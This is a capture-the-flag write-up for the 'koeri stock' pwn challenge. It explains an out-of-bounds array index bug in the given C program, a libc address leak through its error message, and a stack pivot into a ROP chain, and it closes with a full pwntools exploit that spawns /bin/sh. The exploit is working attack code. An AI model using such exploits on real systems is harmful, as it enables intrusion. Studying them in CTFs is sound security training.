This chall has 17 solves durning the competition.
We are given the source code in this chall aswell:

```
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#define ALARM_SECONDS 60

void be_a_ctf_challenge() {
    alarm(ALARM_SECONDS);
    setvbuf(stdout, (char *)0x0, 2, 1);
}

void koeri_choice(int data[7], int add) {
    int koeri_choice;
    int amount;
    int max_koeri = sizeof(*data) * sizeof(int);
    puts("Which kœri to add?");
    puts("[0] Sauce [1-6] Spice N");
    scanf("%d", &koeri_choice);
    if (koeri_choice < max_koeri) {
        puts("Amount");
        scanf("%d", &amount);
        if (add) {
            data[koeri_choice] += amount;
        } else {
            data[koeri_choice] -= amount;
            if (data[koeri_choice] < 0) {
                printf("Error, %d is an illegal value! Resetting to zero. Recount!\n",
                        data[koeri_choice]);
                data[koeri_choice] = 0;

            }
        }
    }
    else {
        puts("We do not have that kœri, yet");
    }
}

void print_stock(int data[7]) {
    for (int i = 0; i < 7; i++) {
        if (i == 0) {
            printf("Kœri sauce: %d\n", data[i]);
        }
        else {
            printf("Kœri spice no. %d: %d\n", i, data[i]);
        }
    }
}

int main(int argc, char** argv) {
    be_a_ctf_challenge();
    int choice;
    int data[7] = {0};
    while (1) {
        puts("[1] Add kœri to stock [2] Subtract kœri to stock\n[3] Print kœri stock [4] Exit");
        scanf("%d", &choice);
        if (choice == 1) {
            koeri_choice(data, 1);
        } else if (choice == 2) {
            koeri_choice(data, 0);
        } else if (choice == 3) {
            print_stock(data);
        } else if (choice == 4) {
            puts("Exiting...");
            break;
        } else {
            puts("Invalid choice");
        }
    }
    return 0;
}

```

The bug here is inside the `koeri_choice` function.
when we enter index, it only checks if `index < sizeof(*data) * sizeof(int)`. but index will be an index in the array of size 7, and the left side of the equation will be the size of the array in memory. which is 7*8. so we have an oob here.
We can basiclly add anything we want to the RIP/RBP, and with the subtract option, if `data[index] - amount < 0`, it will give us a leak.
So first of all, lets leak libc.
we can do it by using our Out-Of-Bounds primitive, and subtract a really big number from main's return pointe, which is index 14 in the array (its a libc address, and it will not interrupt the execution until the program ends)
the lower 4 bytes of main's return pointer is already negative, so we can basiclly do `subtract(14, 0)`, and get the lower bytes.
To get the most siginifcant bytes, we can subtract a really big number, leak the value, and add the number to cancel the subtraction:
```py
	libc_lower = 0xffffffff + substract(14, 0)+ 1
	libc_upper = (0xffffffff + substract(15, 0x10000000) + 1 + 0x10000000) & 0xffffffff
	libc.address = ((libc_upper << 32) + libc_lower)- 0x23510
  ```
  
  now, we'll use the same primitive to control code execution.
  since we don't have a PIE leak, we can't really do a ret2libc, because we would need to change the function's return ptr, which is a binary address we don't know.
  But, we CAN jump to any gadget inside the binary. the offsets of addresses are constant, so `koeri_choice_ret_addr - some_gadget` = constant. this means we can add this constant to the return ptr, and jump to our gadget.
  In my exploit, I used an `add rsp, 0x20 ; pop rbp ; ret` gadget, to pivot our stack. in fact, the add rsp; pop, is enough to make rsp be inside our `data` buffer. then we have a complete libc rop chain.
  (I zeroed our the values in the array, using `substract(index, 0x10000000)`, and the nadded our addresses.)
  
  Full exploit:
  
  ```py
 from pwn import *


libc = ELF('./libc.so.6')
#p = remote('koeri-stock-0.chals.kitctf.de', 1337, ssl=True)
p = gdb.debug('./main')
libc_rop = ROP(libc)

def add(idx, amount):
	p.recvuntil('Exit')
	p.sendline('1')
	p.recvuntil("Spice N")
	p.sendline(str(idx))
	p.recvline()
	p.sendline(str(amount))


def substract(idx, amount):
	(p.recvuntil('Exit\n'))
	p.sendline('2')
	(p.recvuntil("Spice N"))
	p.sendline(str(idx))
	(p.recvline())
	p.sendline(str(amount))
	(p.recvline())
	res = p.recvline()
	if b'Error' in res:
		res = res.replace(b' is an illegal value! Resetting to zero. Recount!\n', b'').replace(b'Error, ', b'')
		return int(res)
	return None

def add_rop_address(index, addr):
	#zero out the array elements

	substract(index, 0x10000000)
	substract(index+1, 0x10000000)

	#add the addreeses
	add(index, addr & 0xffffffff)
	add(index+1, (addr >> 32))


def main():

	libc_lower = 0xffffffff + substract(14, 0)+ 1

	libc_upper = (0xffffffff + substract(15, 0x10000000) + 1 + 0x10000000) & 0xffffffff

	libc.address = ((libc_upper << 32) + libc_lower)- 0x23510


	POPRDI = libc.address + (libc_rop.find_gadget(['pop rdi', 'ret']))[0]
	RET = libc.address + (libc_rop.find_gadget(['ret']))[0]
	SYSTEM = libc.sym["system"]
	BINSH = next(libc.search(b"/bin/sh"))

	print("Libc address is", hex(libc.address))
	print("POPRDI address is", hex(POPRDI))
	print("SYSTEM address is", hex(SYSTEM))
	print("BINSH address is", hex(BINSH))


	add_rop_address(2, RET)
	add_rop_address(4, POPRDI)
	add_rop_address(6, BINSH)
	add_rop_address(8, SYSTEM)

	#this gadget will move the stack inside the data array, which will give us a complete rop chain

	fake_stack_gadget = 0x12e0 # add rsp, 0x20 ; pop rbp ; ret
	koeri_choice_ret = 0x13de

	add(-10, (fake_stack_gadget - koeri_choice_ret)) #we don't need PIE leak here, because we can just add a constant address from one instruction to another
	p.interactive()


main()
```
  
